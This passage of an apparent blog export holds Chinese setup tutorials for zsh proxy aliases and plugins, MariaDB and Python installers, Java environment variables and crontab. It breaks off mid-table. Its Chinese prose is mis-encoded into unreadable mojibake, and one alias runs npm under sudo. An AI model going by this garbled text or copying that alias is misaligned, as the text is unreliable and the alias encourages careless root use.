<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Proxy config</span></span><br><span class="line"><span class="keyword">export</span> hostip=$(cat /etc/resolv.conf | grep -oP &#x27;(?&lt;=nameserver\ ).*&#x27;)</span><br><span class="line">alias proxyon=&#x27;<span class="keyword">export</span> https_proxy=<span class="string">&quot;http://$&#123;hostip&#125;:7890&quot;</span> &amp;&amp; <span class="keyword">export</span> http_proxy=<span class="string">&quot;http://$&#123;hostip&#125;:7890&quot;</span> &amp;&amp; <span class="keyword">export</span> all_proxy=<span class="string">&quot;socks5://$&#123;hostip&#125;:7890&quot;</span>&#x27;</span><br><span class="line">alias unproxy=&#x27;<span class="keyword">unset</span> http_proxy &amp;&amp; <span class="keyword">unset</span> https_proxy &amp;&amp; <span class="keyword">unset</span> all_proxy&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>å¸¸ç”¨åˆ«åè®¾ç½®</strong></p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># git <span class="keyword">log</span></span><br><span class="line"><span class="keyword">alias</span> glog=<span class="string">&#x27;git log --graph --pretty=oneline --abbrev-commit&#x27;</span></span><br><span class="line"></span><br><span class="line"># <span class="keyword">ls</span> -al</span><br><span class="line"><span class="keyword">alias</span> ll=<span class="keyword">ls</span> -al --show-<span class="keyword">control</span>-chars --<span class="keyword">color</span> $*</span><br><span class="line"></span><br><span class="line"># Other <span class="keyword">alias</span> config</span><br><span class="line"><span class="keyword">alias</span> ipython=<span class="string">&#x27;ipython3&#x27;</span></span><br><span class="line"><span class="keyword">alias</span> npm=<span class="string">&#x27;sudo npm&#x27;</span></span><br><span class="line"><span class="keyword">alias</span> typora=<span class="string">&#x27;typora.exe&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="é…ç½®å…¶ä»–ç”¨æˆ·å¯ç”¨"><a href="#é…ç½®å…¶ä»–ç”¨æˆ·å¯ç”¨" class="headerlink" title="é…ç½®å…¶ä»–ç”¨æˆ·å¯ç”¨"></a>é…ç½®å…¶ä»–ç”¨æˆ·å¯ç”¨</h2><blockquote>
<p>è¯¥æ–¹æ³•è™½ç„¶å¯ä»¥ä¸€æ¬¡é…ç½®å…¨å±€ç”Ÿæ•ˆ, ä½†ä¼šå­˜åœ¨æƒé™é—®é¢˜æ•…ä¸å»ºè®®ä½¿ç”¨.</p>
<p>å»ºè®®å…¶å®ƒç”¨æˆ·æœ€å¥½é‡æ–°å®‰è£…é…ç½®.</p>
</blockquote>
<p>ä¸ºrootç”¨æˆ·å»ºç«‹è½¯è¿æ¥ï¼Œå³rootç”¨æˆ·ä½¿ç”¨å½“å‰ç”¨æˆ·çš„é…ç½®</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s <span class="variable">$HOME</span>/.oh-my-zsh /root/.oh-my-zsh</span><br><span class="line">sudo <span class="built_in">ln</span> -s <span class="variable">$HOME</span>/.zshrc /root/.zshrc</span><br></pre></td></tr></table></figure>

<p>åˆ‡æ¢rootè¿›å…¥zshï¼Œè‹¥æç¤ºæ— pyenvå‘½ä»¤ï¼Œåˆ™å†å»ºç«‹è½¯è¿æ¥å³å¯</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">ln</span> -s <span class="variable">$HOME</span>/.pyenv /root/.pyenv</span><br></pre></td></tr></table></figure>

<p>è‹¥æç¤ºç›®å½•æƒé™è­¦å‘Šï¼Œåˆ™åœ¨ .zshrc æ–‡ä»¶å‰é¢æ·»åŠ </p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">ZSH_DISABLE_COMPFIX</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p>è‹¥è¦å•ç‹¬é…ç½®ï¼Œå¤åˆ¶ç›¸åº”ç›®å½•åˆ°å¯¹åº”ç”¨æˆ·ä¸»ç›®å½•ä¸‹å³å¯</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">cp</span> -r <span class="variable">$HOME</span>/.oh-my-zsh	/root</span><br><span class="line">sudo <span class="built_in">cp</span> -r <span class="variable">$HOME</span>/.zshrc	/root</span><br></pre></td></tr></table></figure>



<h2 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h2><h3 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3d0aW5nL2F1dG9qdW1w">autojump</span></h3><blockquote>
<p>å¿«é€Ÿè·³è½¬ç›®å½•</p>
</blockquote>
<p>è½¯ä»¶åŒ…å®‰è£…</p>
<p><strong>apt-get</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install autojump</span><br></pre></td></tr></table></figure>

<p><strong>pacman</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">pacman -S <span class="built_in">auto</span>jump</span><br></pre></td></tr></table></figure>

<p>ä»ä»“åº“å®‰è£…</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/wting/</span>autojump.git</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è·³è½¬ç›®å½•å®‰è£…</span></span><br><span class="line"><span class="built_in">cd</span> autojump</span><br><span class="line">./install.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸è½½</span></span><br><span class="line">./uninstall.py</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨æ–¹æ³•</p>
<figure class="highlight bnf"><table><tr><td class="code"><pre><span class="line">j <span class="attribute">&lt;éƒ¨åˆ†ç›®å½•å&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="zsh-autosuggestions"><a href="#zsh-autosuggestions" class="headerlink" title="zsh-autosuggestions"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pzaC11c2Vycy96c2gtYXV0b3N1Z2dlc3Rpb25z">zsh-autosuggestions</span></h3><blockquote>
<p>å†å²å‘½ä»¤ç°è‰²æç¤º</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure>

<h3 id="zsh-syntax-highlighting"><a href="#zsh-syntax-highlighting" class="headerlink" title="zsh-syntax-highlighting"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3pzaC11c2Vycy96c2gtc3ludGF4LWhpZ2hsaWdodGluZw==">zsh-syntax-highlighting</span></h3><blockquote>
<p>æ­£ç¡®è¯­æ³•é«˜äº®æç¤º</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>

<h3 id="git-open"><a href="#git-open" class="headerlink" title="git-open"></a><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhdWxpcmlzaC9naXQtb3Blbg==">git-open</span></h3><blockquote>
<p>æµè§ˆå™¨å¿«é€Ÿæ‰“å¼€gité¡¹ç›®</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/paulirish/git-open.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/git-open</span><br></pre></td></tr></table></figure>

<p>ç›´æ¥åœ¨ä»“åº“ç›®å½•ä¸‹ä½¿ç”¨</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">git open</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®æ’ä»¶"><a href="#é…ç½®æ’ä»¶" class="headerlink" title="é…ç½®æ’ä»¶"></a>é…ç½®æ’ä»¶</h3><p><em>æ³¨æ„ï¼šæ’ä»¶ä¸­é—´æ˜¯ä»¥ç©ºæ ¼åˆ†å¼€</em></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">plugins</span><span class="operator">=</span>(git zsh-autosuggestions zsh-syntax-highlighting git-open)</span><br></pre></td></tr></table></figure>

<h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><p>æ‰“å°ä¸€åªå®å¯æ¢¦: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Bvc3NhdHRpL3Bva2Vtb25zYXk=">pokemonsay</span></p>
]]></content>
      <categories>
        <category>é…ç½®è®°å½•</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Terminal</tag>
        <tag>zsh</tag>
      </tags>
  </entry>
  <entry>
    <title>MariaDB å®‰è£…å›¾æ–‡æ•™ç¨‹</title>
    <url>/9ec13a7e/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<h2 id="ç®€å•ä»‹ç»"><a href="#ç®€å•ä»‹ç»" class="headerlink" title="ç®€å•ä»‹ç»"></a>ç®€å•ä»‹ç»</h2><p>å¯¹äºåˆå­¦è€…, åªéœ€è¦çŸ¥é“ä»¥ä¸‹å‡ ç‚¹å°±è¡Œäº†</p>
<ul>
<li><p>MariaDB æ˜¯å¼€æºè½¯ä»¶</p>
</li>
<li><p>MariaDB æ˜¯ MySQL çš„åˆ†æ”¯</p>
</li>
<li><p>æä¾›äº†ä¸MySQLç›¸åŒçš„åŠŸèƒ½</p>
</li>
<li><p>å’Œ MySQL ä¸€æ ·æ˜¯ <strong>å…³ç³»å‹æ•°æ®åº“</strong></p>
</li>
</ul>
<h2 id="ä¸‹è½½-MariaDB-å®‰è£…åŒ…"><a href="#ä¸‹è½½-MariaDB-å®‰è£…åŒ…" class="headerlink" title="ä¸‹è½½ MariaDB å®‰è£…åŒ…"></a>ä¸‹è½½ MariaDB å®‰è£…åŒ…</h2><p><span class="exturl" data-url="aHR0cHM6Ly9tYXJpYWRiLmNvbS9kb3dubG9hZHMv">å®˜ç½‘ä¸‹è½½</span></p>
<p>æ‰“å¼€åå¤§æ¦‚æ˜¯è¿™ä¸ªæ ·å­ï¼Œè¿™é‡Œè¦æ³¨æ„ä¸‹ï¼Œä¸åŒæ—¶æœŸç½‘ç«™çš„å¤–è§‚å¯èƒ½ä¼šä¸åŒï¼Œä½†è½¯ä»¶çš„ä¸‹è½½é¡µåœ°å€æ˜¯ä¸ä¼šå˜çš„ã€‚</p>
<p><img data-src="http://img.owq.world/2021/11/2111-62424c.png"></p>
<p>è½¯ä»¶ç‰ˆæœ¬é€‰æ‹©é»˜è®¤(æœ€æ–°ç‰ˆ)å°±è¡Œäº†<br>æ‰‹åŠ¨é€‰æ‹©ä¸‹ç³»ç»Ÿç‰ˆæœ¬, Windows 64ä½é€‰æ‹© <code>MS Windows (64-bit)</code><br>å¦‚æœä¸çŸ¥é“è‡ªå·±çš„ç³»ç»Ÿæ˜¯å¤šå°‘ä½çš„, é‚£å°±é€‰æ‹©32ä½åŒ… <code>MS Windows (32-bit)</code><br>é€‰æ‹©å¥½å, ä½ ä¼šå‘ç°ä¸‹é¢çš„é“¾æ¥æ˜¯ä¼šå˜çš„, è¿™å°±æ˜¯ä½ è¦ä¸‹è½½çš„æ–‡ä»¶, è®©æˆ‘ä»¬ç‚¹å‡» <code>Download</code> å¼€å§‹ä¸‹è½½</p>
<p><img data-src="http://img.owq.world/2021/11/2112-284361.png"></p>
<p>ç‚¹å‡»åä¼šè·³è½¬åˆ° &quot;æ„Ÿè°¢ä¸‹è½½&quot; é¡µé¢, è¿™æ—¶å€™ç­‰å¾…ä¸‹è½½é“¾æ¥å»ºç«‹èµ·æ¥å°±è¡Œäº†</p>
<p><img data-src="http://img.owq.world/2021/11/2115-3660c6.png"></p>
<h2 id="å®‰è£…-MariaDB"><a href="#å®‰è£…-MariaDB" class="headerlink" title="å®‰è£… MariaDB"></a>å®‰è£… MariaDB</h2><img data-src="http://img.owq.world/2021/11/2114-1271e8.png" style="zoom:50%;" />

<p>å‹¾é€‰&quot;æ¥å—ä½¿ç”¨è®¸å¯æ¡æ¬¾&quot;, ç„¶å<code>Next</code>è¿›å…¥ä¸‹ä¸€æ­¥</p>
<img data-src="http://img.owq.world/2021/11/2115-52857d.png" style="zoom:50%;" />

<p>å·¦è¾¹åŒºåŸŸæ˜¯è¦å®‰è£…çš„ç»„ä»¶, å³è¾¹æ˜¯å¯¹åº”ç»„ä»¶çš„è¯´æ˜, é»˜è®¤è®¾ç½®å°±è¡Œäº†<br><em>(ä¹‹åå¦‚æœè¦åˆ é™¤ä¸éœ€è¦çš„ç»„ä»¶, é‡æ–°æ‰“å¼€å®‰è£…åŒ…ä¸‹å°±å¯ä»¥åˆ é™¤äº†)</em><br>ç‚¹å‡» <code>Browse...</code> , ä¿®æ”¹ä¸‹å‚¨å­˜è·¯å¾„, é»˜è®¤è½¯ä»¶æ˜¯æ”¾åœ¨ Cç›˜ ä¸‹çš„<br>è¿™é‡Œæ¨èæ”¾åœ¨å…¶å®ƒç›˜é‡Œ, æ¯”å¦‚æˆ‘å°±æ”¾åœ¨ <code>D:\Environment\MariaDB</code> è¿™ä¸ªè·¯å¾„ä¸‹</p>
<img data-src="http://img.owq.world/2021/11/2116-2e7524.png" style="zoom:50%;" />

<p>è®¾ç½® <code>root</code> ç”¨æˆ·å¯†ç , è¾“å…¥ä¸¤æ¬¡å¯†ç ä»¥ç¡®è®¤, <strong>å¯†ç è¦è®°ç‰¢, å¿˜è®°çš„è¯å°±åªèƒ½é‡æ–°å®‰è£…äº†</strong>, ç„¶åå‹¾ä¸Š <code>Use UTF8 as default server&#39;s character set</code>, è¿™ä¸ªæ˜¯è®¾ç½® <code>*UTF-8*</code> ä¸ºé»˜è®¤ç¼–ç çš„, é˜²æ­¢ä¸­æ–‡ä¹±ç å¿…å¤‡é€‰é¡¹</p>
<img data-src="http://img.owq.world/2021/11/2116-7f0aec.png" style="zoom:50%;" />



<p>è®¾ç½®æœåŠ¡åç§°, è¿™é‡Œæˆ‘å¡«çš„æ˜¯ <code>MariaDB</code> , åç§°æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„<br>è®¾ç½®è®¿é—®ç«¯å£å·, ç”¨æ¥è®¿é—®ä½ çš„ MariaDB æ•°æ®åº“ç”¨çš„, é»˜è®¤å¡« <code>3306</code> ,è¿™ä¸ªè¦ç‰¢è®°<br>ä¸‹é¢çš„ç¼“å†²æ± å¤§å°ä¸ç”¨ç®¡å®ƒ, å¯¹å‰æœŸå­¦ä¹ æ²¡æœ‰å½±å“çš„</p>
<img data-src="http://img.owq.world/2021/11/2116-59615f.png" style="zoom:50%;" />

<p>å¼€å§‹å®‰è£…...</p>
<img data-src="http://img.owq.world/2021/11/2116-ff9d22.png" style="zoom:50%;" />

<p>é™å¾…ä¸€ä¼šå„¿ å°±å¤§åŠŸå‘Šæˆäº†~</p>
<img data-src="http://img.owq.world/2021/11/2116-d26191.png" style="zoom:50%;" />
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>MariaDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Python å¼€å‘ç¯å¢ƒæ­å»ºèŒæ–°æ•™ç¨‹</title>
    <url>/958bc56b/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<h2 id="ä¸‹è½½å®‰è£…åŒ…"><a href="#ä¸‹è½½å®‰è£…åŒ…" class="headerlink" title="ä¸‹è½½å®‰è£…åŒ…"></a>ä¸‹è½½å®‰è£…åŒ…</h2><p><span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMv">å®˜ç½‘ä¸‹è½½</span>, åˆšå¼€å§‹å­¦ä¹ çš„è¯ç›´æ¥ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„å°±è¡Œäº†</p>
<p><img data-src="http://img.owq.world/2021/11/2120-1da682.png"></p>
<p>é»˜è®¤ä¸‹è½½ä¸º64ä½ç‰ˆæœ¬å°±è¡Œäº† è¦ä¸‹è½½32ä½è¯·è·³è½¬<span class="exturl" data-url="aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kb3dubG9hZHMvd2luZG93cy8=">è¯¦ç»†é¡µé¢ä¸‹è½½</span></p>
<p><img data-src="http://img.owq.world/2021/11/2120-92875c.png"></p>
<h2 id="å®‰è£…å›¾ç¤º"><a href="#å®‰è£…å›¾ç¤º" class="headerlink" title="å®‰è£…å›¾ç¤º"></a>å®‰è£…å›¾ç¤º</h2><p>æ‰“å¼€å®‰è£…åŒ… å‹¾ä¸Šç¯å¢ƒå˜é‡ ç„¶åé€‰æ‹©è‡ªå®šä¹‰å®‰è£…</p>
<img data-src="http://img.owq.world/2021/11/2118-b66de4.png" style="zoom:50%;" />

<p>é…ç½®å®‰è£…é€‰é¡¹ ä¾éœ€æ±‚æ›´æ”¹ é»˜è®¤å…¨å‹¾ä¸Šå°±è¡Œäº† &gt;&gt; <strong>Next</strong></p>
<img data-src="http://img.owq.world/2021/11/2120-00e3ae.png" style="zoom:50%;" />

<p>å‹¾ä¸Šç¬¬ä¸€ä¸ªé€‰é¡¹ &quot;ä¸ºå…¨éƒ¨ç”¨æˆ·å®‰è£…&quot; &gt;&gt; <strong>Install</strong></p>
<img data-src="http://img.owq.world/2021/11/2122-72c13f.png" style="zoom:50%;" />

<p>ç­‰å¾…å®‰è£…å®Œæˆ ç„¶åç‚¹ä¸€ä¸‹å®ƒ è§£é™¤è·¯å¾„é•¿åº¦é™åˆ¶ &gt;&gt; <strong>Close</strong></p>
<img data-src="http://img.owq.world/2021/11/2121-7daf02.png" style="zoom:50%;" />



<h2 id="éªŒè¯å®‰è£…ç»“æœ"><a href="#éªŒè¯å®‰è£…ç»“æœ" class="headerlink" title="éªŒè¯å®‰è£…ç»“æœ"></a>éªŒè¯å®‰è£…ç»“æœ</h2><p>Win + R æ‰“å¼€&quot;è¿è¡Œ&quot; è¾“å…¥ cmd å›è½¦æ‰“å¼€</p>
<img data-src="http://img.owq.world/2021/11/2121-be174c.png" style="zoom:33%;" />

<p>è¾“å…¥ <code>python -V</code> æŸ¥çœ‹ python ç‰ˆæœ¬ å¦‚æˆåŠŸè¾“å‡ºåˆ™å®‰è£…æˆåŠŸ</p>
<img data-src="http://img.owq.world/2021/11/2122-8b7be8.png" style="zoom:33%;" />









]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Java å¼€å‘ç¯å¢ƒæ­å»ºèŒæ–°æ•™ç¨‹</title>
    <url>/46118abd/</url>
    <content><![CDATA[<style type="text/css">.post img {border-radius: 0;}</style>

<blockquote>
<p> ç”¨æœ€å®ç”¨çš„æ–¹æ³•æ¥è§£å†³é—®é¢˜ã€‚<br>è¯¥æ•™ç¨‹ä¸æ˜¯ç”¨å®‰è£…ç¨‹åºå®‰è£…ï¼Œè€Œæ˜¯é€šè¿‡è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œæ¥å®ç°åŸºç¡€Javaç¯å¢ƒæ­å»ºã€‚</p>
</blockquote>
<hr>
<blockquote>
<p><code>Java</code> æ›´æ–°æ¢ä»£å¤ªå¿«äº†, ä¸çŸ¥ä¸è§‰ç‰ˆæœ¬å·å°±åˆ°19äº†, å‰ä¸¤å¹´è¿˜æ˜¯11(ï¼ _ï¼ ;)<br>è™½è¯´å¦‚æ­¤, é…ç½®æ–¹æ³•è¿˜æ˜¯ä¸€æ ·çš„, é™„ä¸Š<code>17 LTS</code>ç‰ˆJDKä¸‹è½½é“¾æ¥</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC5vcmFjbGUuY29tL2phdmEvMTcvbGF0ZXN0L2pkay0xN193aW5kb3dzLXg2NF9iaW4uemlw">https://download.oracle.com/java/17/latest/jdk-17_windows-x64_bin.zip</span></p>
</blockquote>
<hr>
<h2 id="ä¸‹è½½-Java-JDK"><a href="#ä¸‹è½½-Java-JDK" class="headerlink" title="ä¸‹è½½ Java JDK"></a>ä¸‹è½½ Java JDK</h2><blockquote>
<p> è¿™é‡Œé€‰æ‹© Java8 è¿›è¡Œæ¼”ç¤ºï¼Œå¹¶æä¾›3ç§ä¸‹è½½æ–¹æ³•å‚è€ƒ~</p>
</blockquote>
<ul>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cub3JhY2xlLmNvbS9qYXZhL3RlY2hub2xvZ2llcy9qYXZhc2UtZG93bmxvYWRzLmh0bWw=">å®˜ç½‘</span></p>
<p>å®˜ç½‘çš„ Java 8 åªæä¾›å®‰è£…åŒ…ä¸‹è½½ å¯ä»¥åˆ°å…¶å®ƒåœ°æ–¹ä¸‹è½½æ‰“åŒ…å¥½çš„JDK,è¿™é‡Œä½¿ç”¨ Java 11 åšä¸ºç¤ºä¾‹</p>
<p><img data-src="http://img.owq.world/2021/11/2055-078cf6.png"><br><img data-src="http://img.owq.world/2021/11/2056-418efc.png"></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYXp1bC5jb20vZG93bmxvYWRzL3p1bHUtY29tbXVuaXR5Lz9wYWNrYWdlPWpkaw==">Azul Zulu</span><br>ç½‘é¡µå¾€ä¸‹æ‹‰ï¼Œæ‰¾åˆ°ä¸‹è½½å¤„ï¼Œé€‰æ‹©Javaç‰ˆæœ¬å’Œç³»ç»Ÿï¼Œç„¶åä¸‹è½½å‹ç¼©åŒ…</p>
<p><img data-src="http://img.owq.world/2021/11/2057-075278.png"></p>
</li>
<li><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMTJoRnFBZ1BOQ0h6b09TV21xVG9qdmc=">ç½‘ç›˜ä¸‹è½½</span><br>æå–ç : 47w5</p>
</li>
<li><p>ç‰ˆæœ¬å°è§£</p>
<ul>
<li>Java æ˜¯å‘åå…¼å®¹çš„<ul>
<li>æ–°ç‰ˆæœ¬ä»èƒ½ä½¿ç”¨æ—§ç‰ˆæœ¬å¼€å‘çš„ç¨‹åº</li>
</ul>
</li>
<li>Java 8 æ˜¯ç›®å‰å¸‚åœºä»½é¢æœ€å¤šç‰ˆæœ¬ï¼ˆ2020ï¼‰<ul>
<li>å¾ˆå¤šå…¬å¸ä»åœ¨ç”¨ Java8 å¼€å‘</li>
</ul>
</li>
<li>Java 11 æ˜¯ Java8 åé¦–ä¸ªé•¿æœŸæ”¯æŒç‰ˆæœ¬(LTS)<ul>
<li>å¸‚åœºä»½é¢åœ¨ Java8 ä¹‹å æ­£åœ¨æ…¢æ…¢æå‡ä¸­</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="è§£å‹-Java-JDK"><a href="#è§£å‹-Java-JDK" class="headerlink" title="è§£å‹ Java JDK"></a>è§£å‹ Java JDK</h2><p>è®°ä½è§£å‹è·¯å¾„ è¿™æ˜¯ Java JDK çš„æ ¹ç›®å½•</p>
<p><img data-src="http://img.owq.world/2021/11/2057-02a578.png"></p>
<h2 id="æ·»åŠ ç¯å¢ƒå˜é‡"><a href="#æ·»åŠ ç¯å¢ƒå˜é‡" class="headerlink" title="æ·»åŠ ç¯å¢ƒå˜é‡"></a>æ·»åŠ ç¯å¢ƒå˜é‡</h2><p><code>Win + R</code> è¿è¡Œ è¾“å…¥ <code>sysdm.cpl</code> å›è½¦è¿›å…¥ ç³»ç»Ÿå±æ€§é…ç½®</p>
<img data-src="http://img.owq.world/2021/11/2058-06af6e.png" style="zoom:50%;" />

<p>ä¾æ¬¡ç‚¹å‡» é«˜çº§ &gt;&gt; ç¯å¢ƒå˜é‡</p>
<img data-src="http://img.owq.world/2021/11/2058-e21112.png" style="zoom:50%;" />

<p>æ–°å»º å˜é‡å: <code>JAVA_HOME</code>  å˜é‡å€¼: <code>C:\Java\jdk8.0.275</code>(åˆšåˆšè§£å‹çš„Javaè·¯å¾„)</p>
<img data-src="http://img.owq.world/2021/11/2102-13fe59.png" style="zoom:50%;" />

<p>åŒå‡» <strong>Path</strong> ç¯å¢ƒå˜é‡  è¿›å…¥ç¼–è¾‘ (å›¾ç¤ºæ“ä½œä¹Ÿæ˜¯å¯ä»¥çš„)</p>
<img data-src="http://img.owq.world/2021/11/2102-9698ea.png" style="zoom:50%;" />

<p>æ–°å»ºå˜é‡ <code>%JAVA_HOME%/bin</code></p>
<img data-src="http://img.owq.world/2021/11/2103-f557ae.png" style="zoom:50%;" />

<p>Win7 ä¸‹æ·»åŠ ç¯å¢ƒå˜é‡è¦ç”¨<strong>åˆ†å·</strong>éš”å¼€</p>
<img data-src="http://img.owq.world/2021/11/2103-ee21ba.png" style="zoom:80%;" />



<h2 id="æ£€éªŒç¯å¢ƒ"><a href="#æ£€éªŒç¯å¢ƒ" class="headerlink" title="æ£€éªŒç¯å¢ƒ"></a>æ£€éªŒç¯å¢ƒ</h2><p><code>Win +R</code> è¿è¡Œ cmd è¾“å…¥ <code>java -version</code>  è¾“å‡ºç‰ˆæœ¬ä¿¡æ¯</p>
<p><img data-src="http://img.owq.world/2021/11/2103-5f568b.png"></p>
<h2 id="é”™è¯¯æ’æŸ¥"><a href="#é”™è¯¯æ’æŸ¥" class="headerlink" title="é”™è¯¯æ’æŸ¥"></a>é”™è¯¯æ’æŸ¥</h2><ul>
<li>è‹¥æ˜¯æ²¡æœ‰æ­£å¸¸è¾“å‡º è¯·æ£€æŸ¥ç¯å¢ƒå˜é‡çš„<strong>è·¯å¾„</strong>æ˜¯å¦é…ç½®æ­£ç¡®</li>
<li>åœ¨ cmd çª—å£ è¾“å…¥ <code>echo %JAVA_HOME%</code> æŸ¥çœ‹è·¯å¾„<ul>
<li>æ³¨æ„å¤§å°å†™æ­£ç¡® </li>
<li>æ–œæ æ˜¯å¦å†™å</li>
<li><strong>åˆ†å·</strong> æ˜¯å¦ä¸ºè‹±æ–‡ç¬¦å·</li>
</ul>
</li>
<li>åœ¨ cmd çª—å£ è¾“å…¥ <code>echo %PATH%</code> æŸ¥çœ‹ æ˜¯å¦æœ‰ <code>%JAVA_HOME%\bin</code><ul>
<li>ç³»ç»Ÿä¼šè‡ªåŠ¨æŠŠ <code>%JAVA_HOME%</code> å˜é‡è½¬æ¢æˆè·¯å¾„<br><img data-src="http://img.owq.world/2021/11/2103-615b99.png"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>å­¦ä¹ æ•™ç¨‹</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux crontab å‘½ä»¤</title>
    <url>/crontab/</url>
    <content><![CDATA[<blockquote>
<p>é€šè¿‡crontab å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å›ºå®šçš„é—´éš”æ—¶é—´æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»ŸæŒ‡ä»¤æˆ– shell scriptè„šæœ¬ã€‚</p>
</blockquote>
<h2 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h2><p>ä¿®æ”¹å®šæ—¶ä»»åŠ¡</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo crontab -e</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼ˆå½“å‰ç”¨æˆ·ï¼‰</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">crontab -l </span><br></pre></td></tr></table></figure>

<p>åˆ é™¤æ‰€æœ‰å®šæ—¶ä»»åŠ¡ï¼ˆ&#x2F;var&#x2F;spool&#x2F;cronç›®å½•ä¸‹ï¼‰</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">crontab -r </span><br></pre></td></tr></table></figure>

<p><em>æ³¨: æ–°åˆ›å»ºçš„cron jobï¼Œä¸ä¼šé©¬ä¸Šæ‰§è¡Œï¼Œè‡³å°‘è¦è¿‡2åˆ†é’Ÿæ‰æ‰§è¡Œã€‚å¦‚æœé‡å¯cronåˆ™é©¬ä¸Šæ‰§è¡Œã€‚</em></p>
<h2 id="å›¾è§£å‘½ä»¤"><a href="#å›¾è§£å‘½ä»¤" class="headerlink" title="å›¾è§£å‘½ä»¤"></a>å›¾è§£å‘½ä»¤</h2><p><img data-src="http://img.owq.world/2021/11/1717-e7ebb9.png"></p>
<h2 id="å‘½ä»¤ç¤ºä¾‹"><a href="#å‘½ä»¤ç¤ºä¾‹" class="headerlink" title="å‘½ä»¤ç¤ºä¾‹"></a>å‘½ä»¤ç¤ºä¾‹</h2><table>
<thead>
<tr>
<th align="left">Crontab Entry</th>
<th align="left"><strong>Description</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">*&#x2F;5 * * * *</td>
<td align="left">æ¯ 5 åˆ†é’Ÿè¿è¡Œä¸€æ¬¡ä»»åŠ¡</td>
</tr>
<tr>
<td align="left">0 * * * *</td>
<td align="left">æ¯å°æ—¶æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡</td>
</tr>
<tr>
<td align="left">0 0 * * *</td>
